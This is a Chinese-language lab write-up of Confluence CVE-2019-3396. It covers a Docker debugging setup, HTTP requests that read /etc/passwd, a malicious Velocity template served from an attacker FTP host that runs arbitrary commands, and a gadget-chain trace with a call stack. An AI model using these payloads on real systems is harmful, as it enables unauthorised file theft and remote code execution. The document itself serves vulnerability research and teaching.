    services:
      web:
        image: vulhub/confluence:6.10.2
        ports:
          - "8888:8090"
          - "9999:9999"
        depends_on:
          - db
      db:
        image: postgres:10.7-alpine
        environment:
        - POSTGRES_PASSWORD=postgres
        - POSTGRES_DB=confluence
`9999`端口是用于`jdwp`远程调试的映射端口，`8888`是Web服务的映射端口
启动容器`docker-compose up -d`，然后`root`权限进入容器`docker exec -u root -it 467b4e03119d
bash`
修改配置文件`setenv.sh`，开启`Confluence`的远程调试
    vi /opt/atlassian/confluence/bin/setenv.sh
在配置文件的最后添加：
重启Confluence容器`docker-compose restart`，调试端口就开启了，接下来配置IDEA。
首先将容器中的Confluence复制出来
    docker cp 467b4e03119d:/opt/atlassian/confluence/ test
提取全部的jar
    find ./test -name "*.jar" -exec cp {} ./confluence_jar/ \;
添加jar到项目
为了调试中的字节码匹配，复制出容器中使用的JDK
    docker cp 467b4e03119d:/usr/lib/jvm/java-1.8-openjdk confluence-java-1.8-openjdk
将其设置为项目的JDK
IDEA远程调试配置如下
IDEA-DEBUG端口连接成功则表示调试环境无误。
## 漏洞复现
### 文件读取
    POST /rest/tinymce/1/macro/preview HTTP/1.1
    Host: localhost:8888
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Referer: http://localhost:8888/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
    Content-Type: application/json; charset=utf-8
    Content-Length: 231
    {
        "contentId": "786458",
        "macro": {
            "name": "widget",
            "body": "",
            "params": {
                "url": "https://metacafe.com/v/23464dc6",
                "width": "1000",
                "height": "1000",
                "_template": "file:///etc/passwd"
            }
        }
    }
### 远程命令执行
通过python开启FTP
    python2 -m pyftpdlib -p 21
并放入恶意的`exp.vm`模板文件
    #set ($e="exp")
    #set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
    #set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
    #set($sc = $e.getClass().forName("java.util.Scanner"))
    #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
    #set($scan=$constructor.newInstance($input).useDelimiter("\A"))
    #if($scan.hasNext())
    $scan.next()
    #end
利用`java.lang.Process`执行命令并利用`java.io.InputStream`获取回显。
发送包含模板文件的URL、欲执行的命令的请求
    POST /rest/tinymce/1/macro/preview HTTP/1.1
    Host: localhost:8888
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Referer: http://localhost:8888/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
    Content-Type: application/json; charset=utf-8
    Content-Length: 262
    {
        "contentId": "786458",
        "macro": {
            "name": "widget",
            "body": "",
            "params": {
                "url": "https://metacafe.com/v/23464dc6",
                "width": "1000",
                "height": "1000",
                "_template": "ftp://192.168.100.109/exp.vm",
                "cmd":"ls"
            }
        }
    }
## Gadget chain
根据漏洞描述的`widgetconnector`组件和`java.lang.Runtime`执行命令的断点，找到漏洞流程入口
com.atlassian.confluence.extra.widgetconnector.WidgetMacro#execute(java.util.Map,
java.lang.String,
com.atlassian.confluence.content.render.xhtml.ConversionContext)
这里将JSON数据都存储在`parameters`中，其中url键值通过`RenderUtils.getParameter`提取出来，并将各个参数传入`this.renderManager.getEmbeddedHtml(url,
parameters)`
com.atlassian.confluence.extra.widgetconnector.DefaultRenderManager#getEmbeddedHtml
这里对`this.renderSupporter`对象包含很多渲染类
对应具体目录为
迭代该对象的元素并在if条件中进行判断，通过调用了`widgetRenderer`类的`matches`方法进行判断
com.atlassian.confluence.extra.widgetconnector.video.MetacafeRenderer#matches
POC中会调用`MetacafeRenderer`类的`matches`方法，通过`contains`方法判断是否包含硬编码的`metacafe.com`，因为参数中包含因此能够进入`if`分支，并继续调用`getEmbeddedHtml`方法
com.atlassian.confluence.extra.widgetconnector.video.MetacafeRenderer#getEmbeddedHtml
传入`getEmbeddedHtml`的参数为可控的`params`，除了`metacafe.com`，还有其他的渲染类也能满足
GoogleVideoRenderer
EpisodicRenderer
继续跟进到`DefaultVelocityRenderService`对象的`render`方法
com/atlassian/confluence/extra/widgetconnector/services/DefaultVelocityRenderService.class:60
继续跟进`getRenderedTemplate`
com.atlassian.confluence.extra.widgetconnector.services.DefaultVelocityRenderService#getRenderedTemplate
com.atlassian.confluence.util.velocity.VelocityUtils#getRenderedTemplate(java.lang.String,
java.util.Map)
com.atlassian.confluence.util.velocity.VelocityUtils#getRenderedTemplate(java.lang.String,
org.apache.velocity.context.Context)
com.atlassian.confluence.util.velocity.VelocityUtils#getRenderedTemplateWithoutSwallowingErrors(java.lang.String,
org.apache.velocity.context.Context)
将远程模板`ftp://192.168.50.63/exp.vm`和环境变量层层传递，创建`StringWriter`用于存储结果，继续跟进`renderTemplateWithoutSwallowingErrors`函数
com.atlassian.confluence.util.velocity.VelocityUtils#renderTemplateWithoutSwallowingErrors(java.lang.String,
org.apache.velocity.context.Context, java.io.Writer)
继续跟进
com.atlassian.confluence.util.velocity.VelocityUtils#getTemplate
先跟进`getVelocityEngine()`看结果
com.atlassian.confluence.util.velocity.VelocityUtils#getVelocityEngine
返回生成并返回一个模板引擎对象，并继续调用`getTemplate`函数
org.apache.velocity.app.VelocityEngine#getTemplate(java.lang.String,
java.lang.String)
远程加载模板，过程和上面一样包括初始化加载器、加入缓存等等，不再跟进,向上层层返回模板对象
com.atlassian.confluence.util.velocity.VelocityUtils#renderTemplateWithoutSwallowingErrors(java.lang.String,
org.apache.velocity.context.Context, java.io.Writer)
跟进`renderTemplateWithoutSwallowingErrors`函数
com.atlassian.confluence.util.velocity.VelocityUtils#renderTemplateWithoutSwallowingErrors(org.apache.velocity.Template,
org.apache.velocity.context.Context, java.io.Writer)
这里使用模板对象进行合并操作，完成恶意命令执行，最后的调用栈为：
    exec:443, Runtime (java.lang)
    exec:347, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    doInvoke:385, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)
    invoke:374, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)
    invoke:28, UnboxingMethod (com.atlassian.velocity.htmlsafe.introspection)
    execute:270, ASTMethod (org.apache.velocity.runtime.parser.node)
    execute:262, ASTReference (org.apache.velocity.runtime.parser.node)
    value:507, ASTReference (org.apache.velocity.runtime.parser.node)
    value:71, ASTExpression (org.apache.velocity.runtime.parser.node)
    render:142, ASTSetDirective (org.apache.velocity.runtime.parser.node)
    render:336, SimpleNode (org.apache.velocity.runtime.parser.node)
    merge:328, Template (org.apache.velocity)
    merge:235, Template (org.apache.velocity)
    renderTemplateWithoutSwallowingErrors:68, VelocityUtils (com.atlassian.confluence.util.velocity)
    renderTemplateWithoutSwallowingErrors:76, VelocityUtils (com.atlassian.confluence.util.velocity)
    getRenderedTemplateWithoutSwallowingErrors:59, VelocityUtils (com.atlassian.confluence.util.velocity)
    getRenderedTemplate:38, VelocityUtils (com.atlassian.confluence.util.velocity)
    getRenderedTemplate:29, VelocityUtils (com.atlassian.confluence.util.velocity)
    getRenderedTemplate:78, DefaultVelocityRenderService (com.atlassian.confluence.extra.widgetconnector.services)
    render:72, DefaultVelocityRenderService (com.atlassian.confluence.extra.widgetconnector.services)
    getEmbeddedHtml:42, MetacafeRenderer (com.atlassian.confluence.extra.widgetconnector.video)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeJoinpointUsingReflection:302, AopUtils (org.springframework.aop.support)
    doInvoke:56, ServiceInvoker (org.eclipse.gemini.blueprint.service.importer.support.internal.aop)
    invoke:60, ServiceInvoker (org.eclipse.gemini.blueprint.service.importer.support.internal.aop)
    proceed:179, ReflectiveMethodInvocation (org.springframework.aop.framework)
    doProceed:133, DelegatingIntroductionInterceptor (org.springframework.aop.support)
    invoke:121, DelegatingIntroductionInterceptor (org.springframework.aop.support)
    proceed:179, ReflectiveMethodInvocation (org.springframework.aop.framework)
    invokeUnprivileged:70, ServiceTCCLInterceptor (org.eclipse.gemini.blueprint.service.util.internal.aop)
    invoke:53, ServiceTCCLInterceptor (org.eclipse.gemini.blueprint.service.util.internal.aop)
    proceed:179, ReflectiveMethodInvocation (org.springframework.aop.framework)
    invoke:57, LocalBundleContextAdvice (org.eclipse.gemini.blueprint.service.importer.support)
    proceed:179, ReflectiveMethodInvocation (org.springframework.aop.framework)
    doProceed:133, DelegatingIntroductionInterceptor (org.springframework.aop.support)
    invoke:121, DelegatingIntroductionInterceptor (org.springframework.aop.support)
    proceed:179, ReflectiveMethodInvocation (org.springframework.aop.framework)
    invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework)
    getEmbeddedHtml:-1, $Proxy1665 (com.sun.proxy)
    getEmbeddedHtml:32, DefaultRenderManager (com.atlassian.confluence.extra.widgetconnector)
    execute:73, WidgetMacro (com.atlassian.confluence.extra.widgetconnector)
# 参考
[http://blog.leanote.com/post/zhangyongbo/Velocity%E8%AF%AD%E6%B3%95](http://blog.leanote.com/post/zhangyongbo/Velocity语法)
[https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/](https://caiqiqi.github.io/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/)
[https://lucifaer.com/2019/04/16/Confluence%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-3396%EF%BC%89/](https://lucifaer.com/2019/04/16/Confluence
未授权RCE分析（CVE-2019-3396）/)